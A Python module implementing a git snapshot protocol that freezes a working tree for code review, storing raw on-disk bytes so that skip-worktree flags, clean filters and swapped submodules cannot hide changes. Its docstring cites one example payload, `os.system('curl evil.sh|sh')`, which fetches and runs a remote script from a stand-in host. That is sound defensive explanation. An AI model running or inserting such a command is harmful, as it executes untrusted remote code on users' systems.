"""Snapshot Protocol V2: hash the bytes by storing them, not by describing them.

The V3 fingerprint answered "is this still the tree the reviewers read?" by
reconstructing the tree's identity from `git status` plus `git ls-files
--stage`. Two rounds of adjudication showed the reconstruction is not faithful,
and always in the same direction: **any mechanism that makes git silent about a
path removes that path's bytes from the digest**. `--skip-worktree` and
`--assume-unchanged` (CLA-V4-02) let a tracked file be rewritten or deleted
with the digest unmoved; a gitlink directory emptied or swapped for a plain
directory (CLA-V4-01) collides three visibly different trees onto one value.

V2 stops describing the tree and stores it. Git already has a content-addressed
identity for a tree, and it is not reconstructed from status output: it is the
hash of the objects themselves. The snapshot is four values:

* ``base_commit`` -- HEAD when the round opened. What the change is *against*.
* ``staged_tree`` -- the index as it stands. `git diff` is the working tree
  against the index, so the diff a reviewer reads moves when the index moves.
* ``review_tree`` -- index plus working tree: the bytes pytest, ruff and mypy
  actually load. This is the operative identity of the round.
* ``review_commit`` -- ``review_tree`` committed onto ``base_commit``, so the
  snapshot is reachable, diffable (``git diff base_commit review_commit``) and
  survives `git gc` behind ``refs/cross-review/<run_id>``.

``review_tree`` is built by running ``git add -A`` against a **copy** of the
index in a scratch file, which walks the real working tree. That is what closes
CLA-V4-02: the bytes on disk are read rather than assumed from a status line
git declines to print. The copy is what preserves staged modes -- `read-tree
HEAD` would silently reset a staged ``100755`` back to ``100644``.

``git add`` decides *which* paths exist and with which mode; it does **not**
decide their content. It runs the clean filter and end-of-line conversion, so
with ``core.autocrlf`` or a ``* text=auto eol=lf`` attribute -- both live in
this repository -- the tree holds normalized bytes, and behind a ``filter=``
driver it holds whatever that filter emitted. Measured, not argued: a file
rewritten LF to CRLF produced an identical ``review_tree``, and behind a
one-line clean filter so did a benign file and ``os.system('curl evil.sh|sh')``.
So every blob is rewritten from the disk with ``hash-object --no-filters``
(:func:`_store_raw_bytes`). Anything else leaves a transformation standing
between the disk and the digest, which is the defect V3 died of, relocated.

``git add -A`` has one blind spot of its own, and it is the other half of the
same root cause: at a gitlink it copies the oid out of the index and never
opens the directory, so an emptied or substituted submodule inherits the
identity of the submodule it replaced (CLA-V4-01). :func:`_resolve_gitlinks`
closes it by giving every gitlink path a value derived from what is on disk --
recursively snapshotting a real repository, and demoting anything else to
ordinary content.

Nothing here writes to the repository except one ref under
``refs/cross-review/``. The real index, HEAD, the branches and the working tree
are read and left exactly as they were; every index operation is redirected
through ``GIT_INDEX_FILE`` to a scratch file outside the repository.
"""

from __future__ import annotations

from dataclasses import dataclass
from pathlib import Path
import os
import shutil
import subprocess
import tempfile


#: Artefacts of this system. They change while the round runs, by construction,
#: so a snapshot containing them could never verify. Removed from the index
#: explicitly rather than left to .gitignore, so that editing .gitignore cannot
#: smuggle them into the reviewed tree.
SNAPSHOT_EXCLUDED = (".claude/reviews/runtime/", ".codex-tmp/")

#: One ref per round, deleted by :func:`release`. The namespace is outside
#: refs/heads and refs/tags, so no branch listing, checkout or push is affected.
REF_PREFIX = "refs/cross-review/"

#: Prefixed to every ``git add`` here. ``add`` honours every ignore rule, and
#: whatever it skips is absent from ``review_tree`` and therefore unreviewed --
#: it can be created, edited or removed mid-round with the digest unmoved.
#: ``core.excludesFile`` is the one source that can be switched off, and this
#: switches it off, including the unset-but-defaulted XDG path (CLA-V8-02).
#: Nothing here narrows what ``.gitignore`` or ``$GIT_DIR/info/exclude`` hide;
#: the full scope, with the test pinning each case, is in the "What the snapshot
#: does not cover" section of .claude/reviews/CROSS_REVIEW.md. One constant
#: rather than two literals because
#: applying the override to only one of the two ``add`` call sites is exactly how
#: this was got wrong the first time (F-1).
NO_GLOBAL_EXCLUDES = ("-c", "core.excludesFile=")

#: ``commit-tree`` is a pure function of tree, parent, message, identity and
#: date, so all five are pinned: capturing the same state twice must produce the
#: same commit, otherwise the snapshot could not be compared, only stored.
SNAPSHOT_IDENTITY = {
    "GIT_AUTHOR_NAME": "cross-review",
    "GIT_AUTHOR_EMAIL": "cross-review@invalid",
    "GIT_AUTHOR_DATE": "1970-01-01T00:00:00+0000",
    "GIT_COMMITTER_NAME": "cross-review",
    "GIT_COMMITTER_EMAIL": "cross-review@invalid",
    "GIT_COMMITTER_DATE": "1970-01-01T00:00:00+0000",
}

#: Prefix of the object standing in for a gitlink whose directory on disk is
#: not the submodule the index claims. Distinct from anything git writes there.
GITLINK_MARKER = "snapv2-gitlink"

#: Repositories nested this deep are refused rather than followed, and the
#: gitlink fixpoint is capped at the same number of passes.
MAX_GITLINK_DEPTH = 8

#: A run id becomes part of a ref name. Anything outside this set could walk out
#: of the namespace or build a ref git would refuse.
_RUN_ID_ALLOWED = frozenset(
    "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_"
)


class SnapshotError(RuntimeError):
    """The snapshot could not be taken, or the repository refused it."""


@dataclass(frozen=True)
class Snapshot:
    """The four values that identify one round's tree."""

    base_commit: str
    staged_tree: str
    review_tree: str
    review_commit: str

    def as_dict(self) -> dict[str, str]:
        return {
            "base_commit": self.base_commit,
            "staged_tree": self.staged_tree,
            "review_tree": self.review_tree,
            "review_commit": self.review_commit,
        }


# --- git plumbing ------------------------------------------------------------


def _run(
    root: Path,
    *args: str,
    index: Path | None = None,
    identity: bool = False,
    stdin: bytes | None = None,
) -> subprocess.CompletedProcess[bytes]:
    env = dict(os.environ)

    if index is not None:
        env["GIT_INDEX_FILE"] = str(index)

    if identity:
        env.update(SNAPSHOT_IDENTITY)

    try:
        return subprocess.run(
            ["git", *args], cwd=root, capture_output=True, input=stdin, env=env,
            check=False,
        )
    except OSError as exc:
        # A failure to *start* git produces no return code, so the check below
        # never sees it and a raw OSError reaches the caller -- a missing `cwd`
        # or an over-long argv used to escape as a traceback through the gate.
        # This is the same defect ADJ-V2-05 closed on the fingerprint side; the
        # contract here is that an untakeable snapshot raises SnapshotError.
        raise SnapshotError(f"could not run git {' '.join(args)} in {root}: {exc}") from exc


def _git(
    root: Path,
    *args: str,
    index: Path | None = None,
    identity: bool = False,
    stdin: bytes | None = None,
) -> str:
    result = _run(root, *args, index=index, identity=identity, stdin=stdin)

    if result.returncode != 0:
        detail = result.stderr.decode("utf-8", "replace").strip()
        raise SnapshotError(
            f"git {' '.join(args)} failed ({result.returncode}) in {root}: "
            f"{detail or '[no stderr]'}"
        )

    return result.stdout.decode("utf-8", "surrogateescape")


def ref_name(run_id: str) -> str:
    """The ref protecting one round's review commit."""
    if not run_id or not set(run_id) <= _RUN_ID_ALLOWED:
        raise SnapshotError(f"run_id is not usable in a ref name: {run_id!r}")

    return f"{REF_PREFIX}{run_id}"


# --- capture -----------------------------------------------------------------


def _base_commit(root: Path) -> str:
    result = _run(root, "rev-parse", "--verify", "HEAD")

    if result.returncode != 0:
        raise SnapshotError(
            f"no commit at HEAD in {root}: "
            f"{result.stderr.decode('utf-8', 'replace').strip()}"
        )

    return result.stdout.decode("ascii").strip()


def _real_index(root: Path) -> Path:
    return Path(_git(root, "rev-parse", "--absolute-git-dir").strip()) / "index"


def _copy_index(root: Path, into: Path) -> Path:
    """A scratch copy of the index, outside the repository.

    Copied rather than rebuilt with ``read-tree``: the file carries the staged
    mode of every entry, and rebuilding it from HEAD resets modes to whatever
    the commit held.
    """
    source = _real_index(root)

    try:
        if source.exists():
            shutil.copyfile(source, into)
    except OSError as exc:
        # Same contract as _run: a snapshot that cannot be taken raises
        # SnapshotError. Left bare, a locked, unreadable or vanishing index
        # reached the caller as a raw traceback, so `--start` died on one
        # instead of reporting [NO ROUND] and the gate never reached its
        # CONSENSUS: BLOCKED line. That is ADJ-V2-05 reappearing on a path this
        # module was only reachable from once capture() was wired into the
        # round lifecycle (CLA-V6-02).
        raise SnapshotError(f"could not copy the index of {root}: {exc}") from exc

    return into


def _drop_excluded(root: Path, index: Path, exclusions: tuple[str, ...]) -> None:
    if not exclusions:
        # `ls-files --` with no pathspec lists the whole index, so an empty
        # tuple would empty the tree rather than exclude nothing.
        return

    listed = _git(root, "ls-files", "-z", "--", *exclusions, index=index)
    paths = [path for path in listed.split("\0") if path]

    if paths:
        _git(
            root,
            "update-index",
            "--force-remove",
            "-z",
            "--stdin",
            index=index,
            stdin=("\0".join(paths) + "\0").encode("utf-8", "surrogateescape"),
        )


def _index_entries(root: Path, index: Path) -> list[tuple[str, str, str]]:
    """``(mode, stage, path)`` for every entry in `index`."""
    entries = []

    for entry in _git(root, "ls-files", "--stage", "-z", index=index).split("\0"):
        meta, separator, path = entry.partition("\t")
        fields = meta.split()

        if separator and len(fields) >= 3:
            entries.append((fields[0], fields[2], path))

    return entries


def _raw_oids(root: Path, paths: list[str]) -> list[str]:
    """Blob ids of `paths` read byte for byte off the disk.

    ``--no-filters`` is the whole point: without it ``hash-object`` runs the
    same clean filter and end-of-line conversion that ``git add`` does, and the
    id describes what git would *store* rather than what is on disk.

    ``--stdin-paths`` is newline-delimited with no ``-z`` variant, so a path
    containing a newline cannot go through it and is hashed on its own.
    """
    batched = [path for path in paths if "\n" not in path]
    oids = dict.fromkeys(paths, "")

    if batched:
        output = _git(
            root,
            "hash-object",
            "-w",
            "--no-filters",
            "--stdin-paths",
            stdin=("\n".join(batched) + "\n").encode("utf-8", "surrogateescape"),
        ).split()

        if len(output) != len(batched):
            raise SnapshotError(
                f"hash-object returned {len(output)} ids for {len(batched)} paths"
            )

        oids.update(zip(batched, output))

    for path in paths:
        if "\n" in path:
            oids[path] = _git(
                root, "hash-object", "-w", "--no-filters", "--", path
            ).strip()

    return [oids[path] for path in paths]


def _raw_symlink_oid(root: Path, path: str) -> str:
    """A symlink's blob is its target, and nothing may rewrite it."""
    target = os.readlink(root / path)

    return _git(
        root,
        "hash-object",
        "-w",
        "--no-filters",
        "--stdin",
        stdin=target.encode("utf-8", "surrogateescape"),
    ).strip()


def _store_raw_bytes(root: Path, index: Path) -> None:
    """Replace every blob in `index` with the raw bytes on disk.

    ``git add`` is allowed to decide *which* paths exist, with which mode, and
    which ones were deleted -- it walks the working tree and that enumeration is
    exactly what is wanted. It is not allowed to decide their *content*: it runs
    the clean filter and eol conversion, so with ``core.autocrlf`` or a
    ``* text=auto`` attribute the tree holds normalized bytes, and behind a
    ``filter=`` driver it holds whatever that filter emitted. Two files whose
    bytes on disk differ arbitrarily then reach one tree, which is the same
    failure V3 had: something stands between the disk and the digest.

    Gitlinks are skipped -- :func:`_resolve_gitlinks` already gave them a value
    derived from the directory itself, and they have no blob to read.
    """
    regular, symlinks = [], []

    for mode, stage, path in _index_entries(root, index):
        if stage != "0" or mode == "160000":
            continue

        if (root / path).is_symlink():
            symlinks.append((mode, path))
        elif mode in ("100644", "100755", "120000"):
            regular.append((mode, path))

    records = [
        f"{mode} {oid} 0\t{path}"
        for (mode, path), oid in zip(regular, _raw_oids(root, [p for _, p in regular]))
    ]
    records += [
        f"{mode} {_raw_symlink_oid(root, path)} 0\t{path}" for mode, path in symlinks
    ]

    if records:
        _git(
            root,
            "update-index",
            "-z",
            "--index-info",
            index=index,
            stdin=("\0".join(records) + "\0").encode("utf-8", "surrogateescape"),
        )


def _clear_visibility_flags(root: Path, index: Path) -> None:
    """Drop ``assume-unchanged`` and ``skip-worktree`` from the scratch index.

    Both flags are instructions to git to stop looking at the working tree for a
    path. Left in place, ``git add -A`` would honour them and the snapshot would
    inherit exactly the blind spot this protocol exists to remove (CLA-V4-02).
    They are cleared on the copy; the developer's own index keeps them.
    """
    flagged = [
        entry[2:]
        for entry in _git(root, "ls-files", "-v", "-z", index=index).split("\0")
        if len(entry) > 2 and entry[0] != "H"
    ]

    if not flagged:
        return

    payload = ("\0".join(flagged) + "\0").encode("utf-8", "surrogateescape")

    for flag in ("--no-skip-worktree", "--no-assume-unchanged"):
        _git(root, "update-index", flag, "-z", "--stdin", index=index, stdin=payload)


def _is_repository(path: Path) -> bool:
    """True only when `path` is itself a repository root.

    ``rev-parse`` walks upwards, so every directory inside a repository answers
    yes to "are you in a repository". The question here is whether this
    directory is a *boundary*, so its own toplevel must be itself.
    """
    result = _run(path, "rev-parse", "--show-toplevel")

    if result.returncode != 0:
        return False

    toplevel = result.stdout.decode("utf-8", "surrogateescape").strip()

    return os.path.realpath(toplevel) == os.path.realpath(path)


def _gitlink_paths(root: Path, index: Path) -> list[str]:
    paths = []

    for entry in _git(root, "ls-files", "--stage", "-z", index=index).split("\0"):
        meta, separator, path = entry.partition("\t")

        if separator and meta.split()[:1] == ["160000"]:
            paths.append(path)

    return paths


def _identity_oid(root: Path, description: str) -> str:
    """Store `description` and return its oid.

    The object is written rather than merely hashed so that the value in the
    tree resolves: a reviewer comparing two snapshots can ``cat-file`` it and
    read why they differ, instead of facing an opaque sha.
    """
    return _git(
        root,
        "hash-object",
        "-w",
        "--stdin",
        stdin=description.encode("utf-8", "surrogateescape"),
    ).strip()


def _resolve_gitlinks(
    root: Path, index: Path, exclusions: tuple[str, ...], depth: int
) -> None:
    """Give every gitlink path a value derived from what is actually on disk.

    ``git add -A`` takes a gitlink's oid from the index and never looks inside
    the directory, so a submodule that was emptied, or swapped for a plain
    directory holding arbitrary files, reaches the tree wearing the oid of the
    submodule it replaced (CLA-V4-01). Three shapes a reviewer can trivially
    tell apart arrive identical.

    The rule is the same one the rest of the protocol follows -- describe
    nothing, store what is there -- applied per shape:

    * a real repository is snapshotted **recursively**, so its HEAD, its index
      and its working tree all reach the value. That is strictly more than the
      gitlink oid, which moves only when the submodule commits;
    * anything else that is a directory stops being a gitlink and is added as
      ordinary content, so two plain directories differ exactly when their
      files differ;
    * an empty directory adds nothing, so it keeps an explicit marker -- git
      cannot represent an empty directory in a tree, and without the marker it
      would be indistinguishable from a path that is simply gone.

    A directory added as ordinary content may itself contain a repository, so
    the scan runs to a fixpoint rather than once.
    """
    resolved: set[str] = set()

    for _ in range(MAX_GITLINK_DEPTH):
        pending = [
            path for path in _gitlink_paths(root, index) if path not in resolved
        ]

        if not pending:
            return

        for path in pending:
            resolved.add(path)
            target = root / path

            if _is_repository(target):
                _replace_with_recursive_identity(
                    root, index, exclusions, depth, path, target
                )
            elif target.is_dir():
                _replace_with_directory_content(root, index, path)

            # Absent, or a regular file where a gitlink used to be: `git add -A`
            # already described both, as a deletion and as a blob.


def _replace_with_recursive_identity(
    root: Path,
    index: Path,
    exclusions: tuple[str, ...],
    depth: int,
    path: str,
    target: Path,
) -> None:
    if depth >= MAX_GITLINK_DEPTH:
        raise SnapshotError(
            f"repositories nested more than {MAX_GITLINK_DEPTH} deep at {path}"
        )

    head = _run(target, "rev-parse", "--verify", "HEAD")
    head_oid = (
        head.stdout.decode("ascii").strip() if head.returncode == 0 else "unborn"
    )
    staged_tree, review_tree = _trees(target, exclusions, depth + 1)

    oid = _identity_oid(
        root, f"{GITLINK_MARKER}\0repo\0{head_oid}\0{staged_tree}\0{review_tree}\n"
    )
    _git(
        root,
        "update-index",
        "--add",
        "--cacheinfo",
        f"160000,{oid},{path}",
        index=index,
    )


def _replace_with_directory_content(root: Path, index: Path, path: str) -> None:
    _git(root, "update-index", "--force-remove", "--", path, index=index)
    _git(root, *NO_GLOBAL_EXCLUDES, "add", "-A", "--", path, index=index)

    listed = _git(root, "ls-files", "-z", "--", path, index=index)

    if any(entry for entry in listed.split("\0")):
        return

    oid = _identity_oid(root, f"{GITLINK_MARKER}\0empty-dir\n")
    _git(
        root,
        "update-index",
        "--add",
        "--cacheinfo",
        f"160000,{oid},{path}",
        index=index,
    )


def _trees(
    root: Path, exclusions: tuple[str, ...], depth: int = 0
) -> tuple[str, str]:
    """``(staged_tree, review_tree)``, computed on scratch indexes."""
    try:
        scratch = Path(tempfile.mkdtemp(prefix="cross-review-index-"))
    except OSError as exc:
        # The other half of CLA-V6-02: a full or unwritable temp directory is a
        # snapshot that cannot be taken, not a traceback.
        raise SnapshotError(f"could not create a scratch index directory: {exc}") from exc

    try:
        staged = _copy_index(root, scratch / "staged")
        _drop_excluded(root, staged, exclusions)
        staged_tree = _git(root, "write-tree", index=staged).strip()

        review = _copy_index(root, scratch / "review")
        _clear_visibility_flags(root, review)
        _git(root, *NO_GLOBAL_EXCLUDES, "add", "-A", "--", ".", index=review)
        _resolve_gitlinks(root, review, exclusions, depth)
        _drop_excluded(root, review, exclusions)
        _store_raw_bytes(root, review)
        review_tree = _git(root, "write-tree", index=review).strip()
    finally:
        shutil.rmtree(scratch, ignore_errors=True)

    return staged_tree, review_tree


def capture(
    root: Path, run_id: str, exclusions: tuple[str, ...] = SNAPSHOT_EXCLUDED
) -> Snapshot:
    """Freeze the tree under review and publish it as ``refs/cross-review/``.

    Deterministic: capturing an unchanged tree twice under the same ``run_id``
    returns four identical values.
    """
    ref = ref_name(run_id)
    base_commit = _base_commit(root)
    staged_tree, review_tree = _trees(root, exclusions)

    review_commit = _git(
        root,
        "commit-tree",
        review_tree,
        "-p",
        base_commit,
        "-m",
        f"cross-review snapshot {run_id}",
        identity=True,
    ).strip()

    _git(root, "update-ref", ref, review_commit)

    return Snapshot(base_commit, staged_tree, review_tree, review_commit)


def verify(
    root: Path, snapshot: Snapshot, exclusions: tuple[str, ...] = SNAPSHOT_EXCLUDED
) -> tuple[bool, str]:
    """Is the repository still the tree `snapshot` froze?

    Returns the verdict and, when it is negative, the fields that moved.
    """
    base_commit = _base_commit(root)
    staged_tree, review_tree = _trees(root, exclusions)

    moved = [
        f"{name}: {was} -> {now}"
        for name, was, now in (
            ("base_commit", snapshot.base_commit, base_commit),
            ("staged_tree", snapshot.staged_tree, staged_tree),
            ("review_tree", snapshot.review_tree, review_tree),
        )
        if was != now
    ]

    return (not moved, "; ".join(moved))


def release(root: Path, run_id: str) -> None:
    """Drop the round's ref. Idempotent: a round may end more than once.

    Through ``_git`` rather than ``_run``: ``update-ref -d`` exits 0 for a ref
    that is already gone, so idempotence costs nothing, while a deletion that
    genuinely failed used to be discarded in silence. That let ``--reset``
    print "Cleared the V2 round" and exit 0 with the ref still standing, and
    left the start_run rollback unable to tell that it had not rolled back
    (CLA-V8-01).
    """
    _git(root, "update-ref", "-d", ref_name(run_id))
